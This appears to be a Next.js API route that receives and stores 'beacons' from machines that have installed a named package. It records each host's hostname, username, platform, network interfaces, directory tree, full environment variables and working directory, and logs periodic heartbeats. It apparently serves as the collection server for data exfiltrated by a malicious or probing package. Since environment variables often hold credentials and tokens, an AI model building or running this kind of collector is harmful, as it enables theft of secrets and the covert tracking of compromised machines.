import { NextResponse } from 'next/server';
import db from '@/lib/db';

export async function POST(req: Request) {
  const body = await req.json().catch(() => null);
  if (!body?.beacon_id) return NextResponse.json({ error: 'beacon_id required' }, { status: 400 });

  const now = Math.floor(Date.now() / 1000);
  db.prepare(`
    INSERT INTO beacons (beacon_id, pkg_name, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd, last_seen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(beacon_id) DO UPDATE SET
      last_seen = excluded.last_seen,
      hostname = excluded.hostname,
      cwd = excluded.cwd
  `).run(
    body.beacon_id,
    body.pkg || '',
    body.hostname || null,
    body.username || null,
    body.platform || null,
    body.arch || null,
    body.os_release || null,
    body.interfaces ? JSON.stringify(body.interfaces) : null,
    body.dir_tree ? JSON.stringify(body.dir_tree) : null,
    body.env_vars ? JSON.stringify(body.env_vars) : null,
    body.cwd || null,
    now,
  );

  const beacon = db.prepare('SELECT id FROM beacons WHERE beacon_id = ?').get(body.beacon_id) as { id: number };
  db.prepare('INSERT INTO heartbeats (beacon_id, ts) VALUES (?, ?)').run(beacon.id, now);

  return NextResponse.json({ id: beacon.id });
}
